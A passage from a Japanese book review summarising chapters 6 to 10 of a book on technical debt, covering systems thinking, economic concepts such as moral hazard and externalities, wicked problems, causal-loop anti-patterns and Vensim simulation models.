回避的、遅延している場合はリスク追求的になるという傾向は、日々のプロジェクト管理で強く実感するところです。6. Technical Debt As a Systems Problemシステム思考による技術的負債の理解技術的負債は単なる技術的問題ではなく、組織的なシステム問題として捉えるべきです。第6章では、「玉ねぎモデル」の「システム層」に焦点を当て、組織内のシステム構造と個人の役割がどのように技術的負債の蓄積に寄与するかを分析しています。Figure 6-1 The technical debt onion model より引用著者はドネラ・メドウズの定義を引用し、システムを「一貫して組織化され相互接続されたパターンまたは構造で特徴的な一連の振る舞いを生み出す要素または部品の集合」と説明します。システムの振る舞いは外部要因よりも内部構造によって決定されるという点が重要です。ソフトウェア開発の文脈では、プロジェクトチームや組織構造自体もシステムとして捉える視点が必要です。ITシステムと社会システムの決定的な違いは、社会システム内のコンポーネント（個人）が「独自の目標を追求する能力」を持つことです。この違いはシステムの複雑性と予測不可能性を大幅に増大させます。企業変革のジレンマ　「構造的無能化」はなぜ起きるのか (日本経済新聞出版)作者:宇田川元一日経BPAmazon生物学の例から学ぶシステム的視点Y染色体と胎盤の関係という生物学的例は、目標が競合するシステムコンポーネントがどのように予期せぬ結果をもたらすかを説明しています。一夫多妻制と一夫一婦制のマウスの交配実験は、ソフトウェア開発に直接的な類推を持ちます。プロジェクト（胎児）は最も有利な状態で「生まれる」ことを望み、組織的リソースを最大限に得ようとします。一方で組織（母親）はシステムを維持し将来的な機能を提供し続けるために健全な状態を保とうとします。この拮抗する目標がバランスを崩すと技術的負債の過剰な蓄積につながるのです。「過剰と崩壊」のパターン著者は技術的負債問題の中心に「過剰と崩壊」というパターンがあると主張します。これは再生可能なリソースが持続可能なレベルを超えて利用され、回復不可能なほど枯渇する状態です。古代文明の崩壊や商業漁業における乱獲と同様のパターンがソフトウェア開発にも現れます。ソフトウェア開発における「過剰」とは、タスク完了率の持続不可能なレベルへの引き上げを意味します。プロジェクトが圧力を受けると、補助的活動（良質な要件作成、効果的なテスト、過度な技術的負債の回避など）が放棄されるか最小限に抑えられます。これにより一時的な見かけ上の進捗改善がありますが、長期的には効率の低下と「消火活動モード」と呼ばれる状態への転落を招きます。過剰と崩壊は特に危険です。なぜなら一度崩壊が始まると回復は非常に困難だからです。北海のタラ資源が崩壊すると漁業をすべて停止しても回復しないかもしれないように、プロジェクトが消火活動モードに陥ると、技術的負債の蓄積を止めても既存の負債が残存し回復を妨げるのです。役割による制約と技術的負債著者はシェイクスピアの「世界は舞台、人は皆役者」という言葉を引用し、私たちがソフトウェアプロジェクトにおいて独立した個人としてではなく「役割を演じる人」として意思決定を行うことを指摘します。個人は組織の長期的な利益に反すると認識していても、その役割に合致した決定を下すよう制約されることがあります。プロジェクトマネージャーは締め切りを守るプレッシャーから、長期的な技術的負債を増やす決断をせざるを得ないことがあります。同様に開発者も技術的負債を溜めることの長期的な影響を理解していても、スケジュールプレッシャーから短期的な解決策を選ばざるを得ません。特に重要なのは「基本的帰属の誤り」と呼ばれる認知バイアスです。私たちは他者の行動を彼らの状況や役割ではなく性格に帰属させがちですが、多くの場合、技術的負債を増やす決断は個人の性格ではなく、システム内の役割による制約によるものなのです。プロジェクト見積もりと技術的負債技術的負債の増加に大きく寄与する要因の一つはプロジェクトの過小評価です。著者は入札プロセスの構造がいかに過小評価を生み出すかを説明します。評価チームは可能な限り低い見積もりを望み、入札チームは競争に勝つために最低の入札を提出しようとします。この相互作用は不現実な見積もりを生み出し、プロジェクトの遅延と圧力の増加につながります。過小評価されたプロジェクトは二つの問題に直面します。一つはスケジュールの遅れであり、これは圧力と補助的活動の放棄を引き起こします。もう一つは「フィクション」の創造です。プロジェクト関係者の多くは見積もりが間違っていることを認識していますが、その事実を公に認めることを避けるため、フィクションが維持され、重要な問題が無視されることになるのです。政策抵抗と意図せぬ結果著者は「政策抵抗（policy resistance）」という概念を紹介します。これはシステム内のアクターがルールやポリシーを回避する方法を見つけたり、ポリシー変更によって意図された利益を無効にするような行動を取ることを指します。英国政府の「20%の追加見積もり」政策の例は示唆に富んでいます。この政策に対する抵抗は、まず元の見積もりが約20%削減されてから20%が追加され、結果として提出される見積もりは以前とほぼ同じになります。次に「20%の余裕がある」という誤った認識が生まれ、機能の追加（スコープクリープ）を促進し、結果としてプロジェクトはさらに予算超過と遅延に陥るのです。システム思考なしで導入される政策がいかに期待と反対の結果をもたらすかを示す重要な例です。技術的負債登録簿を確立・維持することが実際には技術的負債の減少ではなく増加につながる可能性があるという反直感的な発見も同様の原理によるものです。システム思考による技術的負債管理技術的負債に対するシステム思考を実践するために、著者はいくつかのアプローチを提案しています。組織構造の見直し：役割間の目標の対立を最小化し、組織全体の長期的目標と個人の目標を整合させる過小評価を避けるメカニズム：見積もりプロセスと入札/選択プロセスを分離し、より現実的な見積もりを促進する補助的活動の価値を可視化：リファクタリング、自動テスト、ドキュメンテーションなどの活動の価値を示すメトリクスを導入「過剰と崩壊」のサインを早期に検出：技術的負債の増加率、バグ発生率、機能実装時間などの指標を追跡この章から得られる最も重要な洞察は、技術的負債の蓄積を促進しているのは個人の意思決定ではなく組織システムの構造であるという理解です。短期的な生産性向上のために補助的活動を放棄すると、長期的には持続可能性の低下と崩壊を招きます。技術的負債管理は単なる技術的な問題解決ではなく、組織全体のシステム設計の問題として取り組むべきなのです。7. Technical Debt As an Economics Problem経済学的視点による新たな洞察技術的負債を経済学の視点から分析することで新たな洞察と解決策が得られるというのが本章の核心です。著者は「玉ねぎモデル」の「経済学またはゲーム理論の層」に焦点を当て、八つの経済学的問題を通して技術的負債の根本的要因を探っています。Figure 7-1 The technical debt onion model より引用経済学的視点を採用する三つの利点として、新鮮な視点による新たな洞察の獲得、1776年のアダム・スミス以来蓄積された膨大な経済学の知見の活用、そして上級ステークホルダーとの共通言語の確立が挙げられています。「経済学は共通の権威ある言語を提供する」という著者の主張に強く共感します。技術チームが「あの人が作業をサボったせいでバグが増えた」といった非難の応酬をしても生産的な解決には至りません。しかし「これはプリンシパル・エージェント問題の一例で情報の非対称性と利害の不一致から生じている」と分析すれば、冷静な議論と建設的な対策が可能になります。企業変革のジレンマ　「構造的無能化」はなぜ起きるのか (日本経済新聞出版)作者:宇田川元一日経BPAmazonプリンシパル・エージェント問題プリンシパル・エージェント問題はエージェント（代理人）がプリンシパル（依頼者）の代わりに行動する際に生じる利害や優先事項の対立を指します。この問題が発生するには「利害の不一致」「情報の非対称性」「プリンシパルがエージェントに影響を与える手段の欠如」のうち少なくとも一つが存在する必要があります。技術的負債の文脈では「利害の不一致」と「情報の非対称性」が特に顕著です。負債のないコードを書くことはプリンシパル（ステークホルダー）にとって有益ですがエージェント（開発チーム）にとっては追加の労力を要します。また多くのステークホルダーやプロジェクトリーダーは技術スキルや経験が不足しているため情報の観察が困難です。複数のプリンシパルが存在する場合この問題はさらに複雑になります。マトリックス管理やビジネス部門、プロジェクトサポートとメンテナンスオペレーション、アーキテクチャチームなど複数のステークホルダーが関与するプロジェクトでは「集合行動問題」が発生します。解決策として「自分の作ったドッグフードを食べる」アプローチがあります。開発チームが通常のハイパーケア期間を超えて自分たちのコードをサポートし維持する責任を持つことで、利害の一致を促進できます。コモンズの悲劇コモンズの悲劇は限られた共有資源の過剰使用に関する概念です。共有地を利用する牧畜業者は新たな動物を追加すると個人はその動物からの利益をすべて享受する一方で、共有地へのダメージはすべての人に分散されます。そのため各牧畜業者が個別に合理的な選択をすると共有地は劣化または破壊されてしまいます。技術的な資産を「コモンズ」とみなすと、組織は同様のジレンマに直面します。各関係者は高品質で負債の少ない技術資産を重視しますが、負債を増やす行動から多くの価値を得ることもできます。例えばプロダクトオーナーがテスト削減の代償として追加機能を詰め込んだり、開発者がコードを再利用する代わりにコピー＆ペーストしたりする行為です。この問題に対する解決策の本質は、すべての技術的資産の明確な所有権を確立することです。また適切な組織文化と社会規範があると、個人は協力してより良い解決策を見つける傾向があります。外部性の問題外部性は一方の当事者が他方の当事者に対しコストや便益を押し付けることができる状況を指します。一般的な例は汚染です。自動車は健康被害というコストを都市住民に押し付けます。著者の元同僚のプロジェクトマネージャーの「それは私の問題じゃない！」という発言はまさに外部性を示しています。このマネージャーは他者に外部性を押し付けることができ、相手はそれを阻止する力がないことを示していました。著者はHMVでの製品を複数のジャンルで表示するプロジェクトを例に挙げます。重複テーブルを作成するという解決策はステークホルダーがプロジェクトチームに押し付けた外部性の例です。クリスマスコードフリーズ前にプロジェクトを完了できましたが、サポートチームに週次データ取り込みのための開発者の時間という継続的な外部コストが課されました。解決策は技術的資産の周囲でより良い財産権を定義し、外部性とは何かについての認識を高めることです。短期主義の影響短期主義は「将来への影響よりも現在の利益や利点だけを考慮する思考や計画の方法」です。外部性とは異なり、コストを課す者と負担する者が同じ当事者である点が特徴です。短期主義は技術的負債と特に関係が深いです。なぜなら負債の返済は常に将来のことであり、便益は通常現在のものだからです。技術的負債項目の返済のコスト便益タイムラインを示したグラフでは、短い期間ではコスト便益曲線が負のままであることが示されています。プロジェクトの期間が短い場合、負債を返済することはプロジェクトにとって価値がありません（組織全体の観点からは価値があるかもしれませんが）。短期主義への対策として、プロジェクトの意思決定者に彼らの視野を現在のプロジェクトを超えて拡大させること、技術的負債のトレードオフ決定を外部関係者ではなく従業員によって行うようにすること、アーキテクチャチームをより多く関与させることが提案されています。小さな決断の専制小さな決断の専制は「個別には小さく重要でない決断の集積が最適でも望ましくもない結果をもたらす現象」を指します。ニューヨーク州イサカの鉄道サービス撤退の例では、多くの乗客が便利な時だけ他の交通手段を選ぶ小さな決断を積み重ねた結果、鉄道は経済的に維持不可能になりました。この問題は特にコーディングに関連しています。開発者は毎回のコード作成や修正時に膨大な数の小さな決断を下します。それぞれの決断は小さなものですが、集合的には大きな意味を持ちます。理想的には重要な決断は階層的な意思決定レベルで行われるべきですが、作業中の実務者が一連の小さな一見無害な決断を行い、結果として重要な決断が事後的に蓄積されることがあります。解決策として、組織の技術アーキテクチャ能力を開発し保護すること、小さな決断の集積が意図しない重要な決断をもたらしていないかコードレビューで確認することが有効です。忍び寄る正常性忍び寄る正常性は「大きな変化や逸脱が小さな漸進的変化を通じて起こるため気づかれない現象」を指します。フォルクスワーゲンの排出ガススキャンダルはこの概念の例です。エンジニアのグループが排出ガス試験などの特定の状況下で排出量を減らすように車のソフトウェアに複数の小さな調整を加えました。ダイアン・ヴォーンはこれを「逸脱の正常化」と呼び、リスクを正当化するための根拠を徐々に調整して増大させることを指します。スペースシャトル・チャレンジャー号の事故もこの例です。技術的負債の文脈では、忍び寄る正常性は「緊急」の問題への対応時に徐々に導入される行動によって起こり得ます。緊急事態が過ぎた後もその行動は元に戻らず、新しい「正常」となります。解決策として「弱いシグナルに注意を払うこと」「不合理に楽観的になる衝動に抵抗すること」「システムオペレーターが安心して発言できること」「監視は終わりのないプロセスであることを認識すること」などが提案されています。アナーキーの代償アナーキーの代償は「システム内のエージェントの自己利益的行動によりシステムの効率がどれだけ低下するかを測定するもの」です。道路交通システムの例では、個々のエージェントが自分のルートを選択できる場合に平均移動時間が増加します。技術的負債に関しても、個人が技術的負債に影響する決断をする際、自分の利益を最大化しますが他者に「増加した移動時間」に相当する負債を残します。極端な場合、アナーキーの究極的な代償はシステムの崩壊です。解決策はアナーキーの代償が高い決断を集中化することです。コーディング標準、技術設計権限、コードレビューポリシーなどの集中的な方針も有効です。モラルハザードモラルハザードは「人々がリスクの全コストを負担しない場合、より多くのリスクを取る状況」を指します。エコノミストのポール・クルーグマンはこれを「ある人がリスクをどれだけ取るかを決定する一方で、物事が悪化した場合のコストを他の誰かが負担する状況」と説明しています。著者は保育所の例を挙げています。保育所は親の遅刻を減らすために罰金を導入しましたが、予想に反して遅刻は増加しました。以前は親は教師との「社会的契約」に基づき遅刻を避けていましたが、罰金システムの導入は社会的契約を取引的なものに置き換え、親はもはや罪悪感を感じることなく遅刻して罰金を支払うことを選んだのです。技術的負債の登録簿を作成すると技術的負債のレベルが減少するのではなく増加する可能性があるというのもモラルハザードの例です。登録簿の作成により負債の作成が正当化され、通常は対処されていたものが登録簿に記載されるようになります。解決策として、組織がソフトウェア開発プロセスの変更を行う前に、それらのプロセスが社会的契約にどの程度依存しているか考慮することが重要です。経済学的視点の活用著者は最後に経済学的問題の活用方法として三つの行動方針を提案しています。各問題に対して提案された解決策を試してみる議論と言語を経済学的なものに変える技術的負債や他のソフトウェア開発問題に対する解決策のためにさらに経済学的パズルを探求する経済学の言語を使用することで、ステークホルダーとの効果的なコミュニケーションが可能になるという点は特に重要です。「外部性」「プリンシパル・エージェント問題」「コモンズの悲劇」といった言葉を使うことで、問題の真の原因とどのように効果的で永続的な解決策を開発するかについての建設的な議論が促進されます。経済学の視点から技術的負債を理解することで、単なる技術的問題としてではなく、組織構造と意思決定プロセスの問題として捉え直す視点が得られるのです。8. Technical Debt As a Wicked Problem技術的負債の最深層技術的負債は単なる技術的問題ではなく、社会的複雑性に起因する「厄介な問題（wicked problem）」であるという視点が本章の中心テーマです。著者はこの「玉ねぎモデル」の最内層に焦点を当て、技術的負債問題が永続化する根本原因を探っています。Figure 8-1 The technical debt onion model より引用冒頭で引用されるジェラルド・ワインバーグの言葉「問題がどのように見えるか、何が問題か、他の人が何と言おうと、それは常に人間の問題である」は、技術的負債の本質を端的に表しています。技術的な問題に見えても、その根底には人間の問題があるのです。気候変動の例は示唆に富んでいます。40年以上認識されながらも効果的な解決に至っていない気候変動は、異なるステークホルダー間で見解が分かれ、単純な解決策が通用しない典型的な厄介な問題です。EU圏内の製造業への排出規制が却って全体の排出量増加につながった事例は、意図せぬ結果をもたらす介入の典型例として技術的負債対策にも重要な教訓を提供します。イシューからはじめよ［改訂版］――知的生産の「シンプルな本質」作者:安宅和人英治出版Amazon厄介な問題の8つの特性著者は厄介な問題と手なずけられた問題を対比しています。クロスワードパズルがどんなに難しくても十分な知識があれば解ける「手なずけられた問題」であるのに対し、技術的負債は「厄介な問題」に該当します。その特性として：問題は解決策を見つけた後でしか理解できない：技術的負債の原因がプロジェクト遅延なのか、誤ったトレードオフなのか、外部性の問題なのかは、解決策を試してみないと見えてこない循環性があります。ステークホルダーは根本的に異なる世界観を持つ：プロダクトオーナーは顧客からの急ぎの要求に重点を置く一方、開発者は技術的負債による制約に囲まれています。この異なる世界観が問題理解を複雑にします。問題の理解の仕方が試す解決策を決定する：各ステークホルダーの世界観によって問題の捉え方が異なり、それに基づいて異なる解決策を提案します。ビジネス側と技術側の分断がここから生じます。解決策は真か偽かではなく良いか悪いかで判断される：技術的負債の解決策に明確な「正解」はなく、各自の世界観に基づいた「より良い」解決策があるだけです。解決策がうまくいったかどうかの即時的で決定的なテストがない：解決策の結果は長期間にわたって現れ、初期には良くても後に悪影響が判明することがあります。あらゆる解決策は「一発勝負」である：厄介な問題への介入は取り返しのつかない結果をもたらすこともあります。厄介な問題は他の厄介な問題と相互に関連している：技術的負債は見積もりやプロジェクト遅延と密接に関連し、互いに循環的に影響し合います。いつ止めるべきかを知る方法がない：問題が十分に理解されているかの明確な基準がなく、多くの場合、時間や予算の制約で対応が中断されます。これらの特性は、技術的負債が単純な技術的修正では解決できない複雑な問題であることを示しています。社会的複雑性と組織的分断著者は「社会的複雑性」の概念を導入し、問題に関わるプレイヤーの数と多様性がさらなる複雑さを生み出すと指摘します。Jeff Conklinの等式「分断 = 厄介さ \xd7 社会的複雑性」が示すように、厄介な問題と社会的複雑性の組み合わせが組織内の分断を引き起こします。単独で問題に取り組む場合、「問題を理解していない」ことは探求の過程として現れますが、複数のステークホルダーが関わると、「理解の欠如」が組織的分断として現れます。この分断を悪化させる要因として「過信効果」と「確証バイアス」が挙げられています。「デザインのジレンマ」として「あるべき姿」と「できること」の間の緊張関係も指摘されています。大規模な組織では「あるべき姿」を追求するグループ（マーケティング、営業など）と「できること」に焦点を当てるグループ（技術系部門）が分断され、互いに対立する文化的戦争が起きやすくなります。この分断の最も確実な指標は「非難」です。技術的負債問題が「統合的な視点」ではなく、互いに責任を押し付け合う「非難文化」として現れる様子が描写されています。解決へのアプローチ著者は厄介な問題への対処法として、「手なずけられた問題のコレクションとして扱う」アプローチの限界を指摘しています。技術的負債登録簿の作成と負債返済チームの設立は一時的な改善をもたらすかもしれませんが、問題は周囲に変形し、長期的な解決には至らない可能性があります。より効果的なアプローチは組織の分断問題に取り組むことです。著者は「共有理解」から「共有コミットメント」へと進む道筋を示しています。共有理解は全員が合意することではなく、互いの立場を十分に理解し、知的な対話ができる状態を指します。この分断への対処ツールとして「ダイアログマッピング」や「議論マッピング」の活用が提案されています。Rationaleなどの議論マッピングソフトウェアを使用して、複雑な問題に関する異なる視点を構造化することで、共有理解の構築を促進できます。技術的負債が単なる技術的問題ではなく、社会的複雑性を持つ厄介な問題であるという本章の視点は、問題の本質理解に大きく貢献します。8つの特性を通じて技術的負債の複雑さを体系的に整理し、問題解決の難しさの根源を「組織的分断」として特定している点は非常に示唆に富みます。特に重要なのは、技術的負債の「社会的複雑性」の側面です。技術的負債を効果的に管理するためには、単に技術的な解決策を見つけるだけでなく、組織全体の協力を促進する「共有理解」と「共有コミットメント」の構築が不可欠です。技術的負債を「人間の問題」として捉え直すことは、この厄介な問題への効果的なアプローチの第一歩となるのです。9. Common Technical Debt Anti-patterns循環するアンチパターンの理解技術的負債は単発的な意思決定ではなく、継続的な決断の連鎖によって蓄積されるという視点が本章の核心です。著者は技術的負債を増大させる10のアンチパターンを因果ループ図を用いて詳細に分析し、効果的な介入ポイントとレバレッジポイントを特定しています。冒頭で紹介される「There\'s a Hole in My Bucket」という童謡の例えは、技術的負債アンチパターンの循環的な性質を端的に表しています。バケツの穴を修理するという単純な問題が、相互接続した問題の連鎖に発展し、最終的には元の問題に戻るという循環性は、技術的負債問題の本質を示しています。特に重要なのは「後期介入のコスト」という概念です。技術的負債も早期に対処しなければ対処自体が困難になるという悪循環に陥ります。プロジェクトの緊急性を優先してテストコードを後回しにすると、技術的負債返済のためのリソースを確保すること自体が困難になる事例は、多くの開発者が経験していることでしょう。ジェームズ・クリアー式 複利で伸びる1つの習慣作者:ジェームズ・クリアーパンローリング株式会社Amazon因果ループ図の力著者は技術的負債アンチパターンを可視化する手法として因果ループ図（Causal Loop Diagram: CLD）を紹介しています。CLDは変数と因果関係を矢印で表現し、「+」（正の関係）と「-」（負の関係）の記号でその影響を示します。アンチパターンの探索と可視化は三つの面で有益です。問題の理解を深める介入ポイントとレバレッジポイントを特定する異なるステークホルダー間の共通理解を促進する特に共通理解の構築は実務上極めて重要です。技術的負債に関する最大の課題は、ビジネス側と技術側の認識の乖離にあります。技術チームが危機感を持って訴える問題が、ビジネス側には「技術者の完璧主義」と誤解されることが多いからです。見積もり罠見積もり罠（Estimation Trap）は、見積もり誤差→プロジェクト遅延→短期目標への集中→技術的負債の増加→見積もり誤差という自己強化ループを形成します。特に注目すべきは「プロジェクト遅延→短期目標への集中」の接続です。プロジェクトが遅延すると人々の心理状態が「利益」から「損失」のマインドセットに切り替わります。これはプロスペクト理論が示すように、人のリスク志向を「リスク回避的」から「リスク追求的」に変え、非合理的行動を促進します。レバレッジポイントとしては、見積もり誤差の縮小、プロジェクト遅延時の再スケジューリング、技術的負債の後処理（ユリシーズ契約）などが挙げられています。特に「ユリシーズ契約」は、事前に自分の行動を縛る仕組みを導入する実践的手法として注目に値します。最後のレースの誘惑最後のレースの日（Last Race of the Day）は賭け事における現象から名付けられたアンチパターンです。競馬で大きく負けている状況では「確率は低いが全額取り戻せる可能性のある選択肢」が選ばれやすくなります。プロジェクトでも遅延状態ではチームのリスク志向が変化し、「すべての遅れを取り戻せる可能性は低いが魅力的な選択肢」を選んでしまいがちです。「新しいフレームワークで生産性が3倍になる」といった根拠の薄い見積もりに基づく決断が、結果的に状況をさらに悪化させる事例は少なくありません。道徳的信任効果道徳的信任効果（Moral Credential Effect）は過去に良い行いをした人が無意識のうちに「次は少し悪いことをしても良い」と思ってしまう心理です。技術的負債の文脈では「予期せぬ技術的負債への対処→チームの美徳意識→負債を作る資格があるという感覚→技術的負債の増加」という循環を形成します。リファクタリングスプリントの直後に「少しくらい負債を作っても良い」という雰囲気が蔓延する現象は、この効果の現れです。これを防ぐには技術的負債の管理を一時的なキャンペーンではなく継続的なプロセスとして位置付ける文化形成が必要です。割れ窓理論と学習性無力感割れ窓理論は環境の悪化が更なる悪化を招くという社会学的概念で、技術的負債の文脈では「すでに負債がある環境ではさらに負債を作っても構わない」という心理が働きます。「レガシーコードに新しいレガシーコードを追加しても問題ない」という考え方がその例です。一方学習性無力感はネガティブな体験の繰り返しによって無力感を学習してしまう心理です。バグ追跡システムに報告したバグが対応されないことを繰り返し経験すると「どうせ報告しても意味がない」とバグ報告をやめてしまいます。対策として「ズブロケンウインドウポリシー（Zero Broken Windows Policy）」の導入が効果的です。どんな小さな問題でも放置せず即座に対応するという方針は、技術チームの当事者意識を高め、負債の増加を抑制します。目標文化と社会的手抜き目標文化（Goal Culture）は過度に目標を強調することで逆効果を招くアンチパターンです。目標への過度な集中は行動変化（OKR代用効果、社会的手抜き）を引き起こし、結果的に目標達成に失敗します。社会的手抜き（Social Loafing）はグループ内では個人が単独の時より努力しなくなる傾向を指します。著者はこれを「怠惰」ではなく「リソース配分の問題」として捉えています。多くの開発者が過度な作業負荷の中で自身の作業を優先し、他者に恩恵をもたらす作業に労力を投じない選択をするのです。OKRと代用効果OKRと代用効果（OKRs and the Surrogation Effect）は指標への過度な集中による弊害を示しています。代用効果とは戦略的目標を表す指標が目標そのものに取って代わる現象で、グッドハートの法則「指標が目標になると指標としての価値を失う」として知られています。1904年の客船ゼネラル・スローカム号の火災事故は、最低重量基準を満たすため救命胴衣に鉄の棒を入れたことが逆に沈下を招いた事例で、「真の目的を見失い指標だけを満たそうとする」行為の危険性を示しています。ソフトウェア開発では「コードカバレッジ率」を指標として重視すると、テストの質ではなく量だけを追求する行動を促してしまう問題が起こります。技術的負債の文脈では代用効果は特に危険です。技術的負債の測定が難しいため「測定されない」部分が軽視される傾向があるからです。消火活動への転落消火活動への転落（Descent into Firefighting）はネルソン・レペニングの研究に基づくアンチパターンで、同じリソースを使いながら効率的なモードから非効率なモードへと転落するプロセスを示しています。作業を「補助的作業」と「不可欠な作業」に分けると、あるプロジェクトが遅延した場合、他のプロジェクトから人員を引き抜いて不可欠な作業を完了させることがあります。しかしその結果、次のプロジェクトでは補助的作業が不十分となり、更なる問題が発生するという連鎖が始まります。特定のポイントを超えると組織は「非効率な消火活動モード」に陥り、回復が極めて困難になります。テストチームが手動テストに追われ、自動テスト構築のための時間を確保できない状態などが典型例です。環境制約の問題限定環境（Limited Environments）アンチパターンは特に大規模組織で見られる問題です。十分なテスト環境が不足していると、プロジェクトは不適切な環境で作業を進めることを強いられます。これは開発・テストの非効率さ、バグの発見遅延、技術的負債の増加につながります。このアンチパターンの恐ろしさは、次のプロジェクトも同じサイクルを繰り返すことで、負のループが組織内に定着してしまう点です。レバレッジポイントとしては「利用可能な環境より多くのプロジェクトをスケジュールしない」「コンテナ化技術を導入して環境生成を容易にする」などが挙げられます。プロトタイプからの負債プロトタイプからの負債（Prototype into Debt）は多くのプロジェクトが陥る典型的なアンチパターンです。プロトタイプは本来「学習のため」に作られるもので技術的負債は高くても問題ありませんが、多くの場合プロトタイプが製品として使われてしまいます。これはプロジェクトがスケジュール圧力に晒されていたり、製品開発にかかる時間を過小評価していたりする場合に起こりやすくなります。フレデリック・ブルックスの「人月の神話」で言及されている「捨てる覚悟で作れ（Plan to throw one away）」という助言が適切なレバレッジポイントとなります。因果ループ図を活用した共通理解の構築著者が提案する因果ループ図を用いたワークショップは、技術的負債問題への効果的なアプローチです。これにより、技術チームとビジネスチームが共通理解を形成し、相互の協力関係を構築することができます。技術的負債管理において重要なのは「問題の根本原因を理解する」ことです。表面的な症状ではなく、組織的・心理的要因に踏み込んだ著者のアプローチは、技術的負債が単なる技術的問題ではなく、組織全体のシステム的な問題であることを浮き彫りにしています。10. Modeling Technical Debt with System Modeling Toolsシミュレーションで見える負債の動的性質技術的負債は静的な問題ではなく動的プロセスとして理解すべきというのが本章の核心です。著者は動的モデリングツールを用いたシミュレーションによって、技術的負債の蓄積とその影響を可視化する手法を紹介しています。ジョージ・ボックスの「すべてのモデルは間違っているが、一部は有用である」という言葉から始まるこの章は、正確な予測よりも理解の促進に重点を置いています。技術的負債の動的モデルを構築する目的は、①共有理解の構築②意思決定結果の探索③関係者のメンタルモデルの強化にあると説明されています。特に重要なのは「WYSIATI（What You See Is All There Is）」というダニエル・カーネマンの概念です。多くの組織で技術的負債が「目に見えない問題」として過小評価される現実があります。見えない問題は存在しないも同然であり、動的モデルはこの「見えないコスト」を具体的な形で示す強力なツールになります。Vensimを用いた技術的負債モデル著者はモデル構築ツールとしてVensimを紹介し、具体的なモデル構築とシミュレーション実行の手順を解説しています。技術的負債モデルの基本構造は「Work Remaining（残作業）」「Work Accomplished（完了した作業）」「Undiscovered Rework（未発見の手戻り）」という3つのストック（箱）と、それらを結ぶフロー（パイプライン）で構成されています。技術的負債を表現するために「fighting fires（消火活動）」というフローと「Technical Debt（技術的負債）」というストックが追加され、「スケジュール圧力」などの変数がこのフローに影響する仕組みになっています。シミュレーション結果から得られる洞察は非常に興味深いものです。特に「予定完了日を8か月から10か月に延長すると、実際の完了が15か月から12.5か月に短縮される」という一見反直感的な結果は印象的でした。この現象の原因は作業品質にあります。非現実的に短い納期は急速なスケジュール圧力の増加を招き、時間外労働の増加から疲労が生じます。これが品質低下と手戻りの増加、さらには生産性の低下をもたらすのです。実際のシミュレーションでは、品質が0.5の水準まで落ち込み、作業の約50%が誤りを含み手戻りが必要になるという恐ろしい状況が示されました。現在の利益と将来のコスト技術的負債のシミュレーションで最も示唆に富む部分は、「負債が現在と将来のプロジェクトに与える異なる影響」の可視化です。モデルでは技術的負債を増やす設定にすると、最初のプロジェクトは約10%短縮され費用も10%削減できます。しかし後続プロジェクトでは技術的負債が「摩擦」として作用し、作業の流れを妨げるため、完了までの時間とコストが大幅に増加します。この洞察はフォン・クラウゼヴィッツの「戦争論」における「摩擦」の概念に類似しています。十分な量の摩擦が蓄積すると、軍隊もソフトウェアチームも投入努力に関わらず何も達成できなくなるのです。シミュレーションでは技術的負債の蓄積によって3つ目のプロジェクトでは7百万ポンドのコスト超過が発生し、場合によってはプロジェクトが完了不能になることが示されました。著者は伝統的なプロジェクト管理の「鉄の三角形」（コスト・範囲・時間）を拡張する視点も提供しています。プロジェクトには少なくとも2つの追加次元「品質」と「技術的負債」があり、三角形に影響することなくこれらを調整できるという洞察は重要です。測定されるのは三角形の目に見える属性だけであり、技術的負債は測定されないため、「何が測定されるかが管理される」という原則に従うと、ほとんど管理されないことになります。社会的手抜きのモデル著者はもう一つのモデル「Social Loafing（社会的手抜き）」も紹介しています。このモデルでは要件・設計・コーディング・テストという開発パイプラインを通して作業がどのように流れるかシミュレーションします。各作業グループは「協力レベル」と「品質レベル」を調整できますが、上流グループが協力や品質を犠牲にして自分たちの作業を早く完了させると、下流グループの生産性が大きく低下する影響が示されています。このモデルから得られる教訓は、個々のグループが自分たちのゴールを最適化しようとする行動が、全体としての成果を損なう可能性があるということです。ウォーターフォール型の開発ではこの問題が顕著になりやすく、一方でアジャイルプロセスでは完了した作業への注目度が高く、個人が「社会的手抜き」に走るインセンティブが少ないと著者は指摘しています。シミュレーションの価値と実践的アプローチ本章を通じて著者が伝えようとしている最も重要なメッセージは「動的シミュレーションによって得られる反直感的な洞察の価値」です。例えば「納期延長が実はプロジェクト短縮につながる」「技術的負債が現在のプロジェクトには有益だが将来のプロジェクトには壊滅的」といった知見は、静的な分析だけでは得られません。動的シミュレーションの強みは「仮想実験場」として機能することです。実際のプロジェクトでは様々な条件を変えて実験することはほぼ不可能ですが、シミュレーションでは数分で多数のバリエーションを試すことができます。コントロールスライダーを調整するだけで、完了予定日・作業品質・技術的負債レベルの変更が、リワークの量・品質の変動・生産性などに与える影響をリアルタイムで観察できるのです。著者はモデル構築を純粋な技術プロセスではなく共有理解を構築するための協働活動として捉えることを強調しています。ビジネスアナリストがビジネスプロセスをマッピングするように、質問を投げかけ、組織・システム・プロセスの動作を理解し、小さなモデルを構築して徐々に機能を追加していくアプローチが推奨されています。特に重要なのは、モデルの動作と特性について事前に関係者の合意を得ることです。シミュレーションが予期せぬ結果や望ましくない結果を生み出した場合に、ステークホルダーがモデルの妥当性を否定したくなる可能性がありますが、事前に合意が得られていれば反論しにくくなります。シミュレーションの力と限界本章で紹介されたシミュレーション手法は、技術的負債の影響を「見える化」する強力なツールですが、いくつかの限界もあります。現実の組織では「2つ先のプロジェクト」よりも目先の納期が優先される状況が多く、将来コストの可視化だけでは意思決定に影響しない場合があります。また、モデルの妥当性検証にも課題があります。技術的負債のような長期的影響を持つ問題は検証サイクルが長く、「モデルが正しかった」と確認できるまでに年単位の時間がかかります。この間にモデルへの信頼が低下すると、継続的な活用が困難になります。とはいえ、シミュレーションモデルは技術的決断の「将来への影響を可視化する窓」として、組織の意思決定能力を向上させる強力なツールです。静的な図や文書だけでは伝えにくい技術的負債の長期的影響や反直感的な振る舞いをシミュレーションを通じて示すことで、組織内の共通理解構築に貢献します。技術的負債管理における動的シミュレーションの価値は、今後ますます高まるでしょう。「見えないコスト」を可視化し、長期的な視点を提供するこのアプローチは、短期的な利益にフォーカスしがちな現代の開発環境において、特に重要な役割を果たすと考えられます。Part III Tackling Technical Debt11. Safely Convincing 